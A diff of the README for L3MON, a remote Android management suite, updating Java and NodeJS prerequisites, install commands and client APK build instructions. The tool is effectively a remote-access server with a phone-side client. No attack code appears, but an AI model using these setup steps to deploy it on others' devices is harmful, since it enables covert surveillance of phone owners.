@@ -1,6 +1,6 @@
 <p align="center">
 <img src="https://github.com/D3VL/L3MON/raw/master/server/assets/webpublic/logo.png" height="60"><br>
-A cloud based remote android managment suite, powered by NodeJS
+A cloud based remote android management suite, powered by NodeJS
 </p>
 
 
@@ -22,21 +22,24 @@ A cloud based remote android managment suite, powered by NodeJS
 - Built In APK Builder
 
 ## Prerequisites 
- - Java Runtime Environment 8
+ - Java Development Kit 11+
     - See [installation](#Installation) for OS specifics
- - NodeJs 
+ - NodeJs 14+ 
  - A Server
+ - Android SDK (for building the client APK from source)
 
 ## Installation 
-1. Install JRE 8 
+1. Install JDK 11+
     - Debian, Ubuntu, Etc
-        - `sudo apt-get install openjdk-8-jre`
+        - `sudo apt-get install openjdk-11-jdk`
     - Fedora, Oracle, Red Hat, etc
-        -  `su -c "yum install java-1.8.0-openjdk"`
+        -  `sudo yum install java-11-openjdk-devel`
     - Windows 
-        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html) for downloads
+        - Download from [Adoptium](https://adoptium.net/)
+    - macOS (Homebrew)
+        - `brew install openjdk@11`
 
-2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)
+2. Install NodeJS 14+ [Instructions Here](https://nodejs.org/en/download/package-manager/)
 
 3. install PM2 
     - `npm install pm2 -g`
@@ -44,6 +47,7 @@ A cloud based remote android managment suite, powered by NodeJS
 4. Download and Extract the latest release from [HERE](https://github.com/D3VL/L3MON/releases/)
 
 5. In the extracted folder, run these commands
+    - `cd server`
     - `npm install` <- install dependencies
     - `pm2 start index.js` <-- start the script
     - `pm2 startup` <- to run L3MON on startup
@@ -60,6 +64,19 @@ A cloud based remote android managment suite, powered by NodeJS
 7. in your browser navigate to `http://<SERVER IP>:22533`
     
 It's recommended to run L3MON behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)
+
+## Building the APK
+
+For detailed instructions on building the Android client APK, see [BUILDING.md](BUILDING.md).
+
+**Quick Start:**
+- **From the web dashboard:** Use the built-in APK Builder (navigate to the Builder page after logging in)
+- **From source:** See `client/` directory and run `./gradlew assembleDebug`
+
+### Client Compatibility
+- **Minimum Android Version:** 5.0 (Lollipop, API 21)
+- **Target Android Version:** 14 (API 34)
+- **Tested on:** Android 5.0 through Android 14
 
 ## Screenshots
 | | | |
@@ -86,4 +103,4 @@ L3MON is built for both Educational and Internal use ONLY.</b>
 
 <br>
 <p align="center">Made with ❤️ By <a href="//d3vl.com">D3VL</a></p>
-<p align="center" style="font-size: 8px">v1.1.0</p>
+<p align="center" style="font-size: 8px">v2.0.0</p>
